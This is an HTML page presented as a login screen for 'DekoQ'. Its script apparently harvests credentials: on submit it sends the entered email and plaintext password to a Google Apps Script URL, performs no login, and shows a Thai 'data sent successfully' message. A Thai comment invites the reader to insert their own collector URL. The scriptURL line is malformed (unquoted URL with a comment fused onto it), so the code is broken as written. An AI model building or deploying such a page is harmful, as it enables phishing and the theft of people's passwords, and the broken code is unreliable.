<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>DekoQ Login</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: linear-gradient(135deg, #007BFF, #0056b3);
      font-family: 'Arial', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      background: white;
      padding: 2rem;
      border-radius: 12px;
      box-shadow: 0 10px 20px rgba(0,0,0,0.2);
      text-align: center;
      width: 90%;
      max-width: 400px;
    }
    h2 {
      margin-bottom: 1.5rem;
      color: #333;
    }
    input[type="email"],
    input[type="password"] {
      width: 100%;
      padding: 0.8rem;
      margin-bottom: 1rem;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 1rem;
    }
    button {
      background: #007BFF;
      color: white;
      border: none;
      padding: 0.8rem 1.2rem;
      border-radius: 8px;
      font-size: 1rem;
      cursor: pointer;
      transition: background 0.3s ease;
    }
    button:hover {
      background: #0056b3;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Login to DekoQ</h2>
    <form>
      <input type="email" name="email" placeholder="Email" required />
      <input type="password" name="password" placeholder="Password" required />
      <button type="submit">Login</button>
    </form>
  </div>

  <script>
    const form = document.querySelector("form");
    const scriptURL = https://script.google.com/macros/s/AKfycbypRR6D0Lk0Xo_KHvdiDz9oIVxKOqC3Br9eTEEjl08T-VZZo7ivKztkNUsnnPb31NYbYg/exec// << ใส่ URL Google Script ของคุณตรงนี้

    form.addEventListener("submit", e => {
      e.preventDefault();
      const email = form.email.value;
      const password = form.password.value;

      fetch(scriptURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, password })
      })
      .then(response => {
        if (response.ok) {
          alert("ส่งข้อมูลสำเร็จแล้ว!");
          form.reset();
        } else {
          alert("เกิดข้อผิดพลาดในการส่งข้อมูล");
        }
      })
      .catch(error => alert("Error: " + error));
    });
  </script>
</body>
</html>
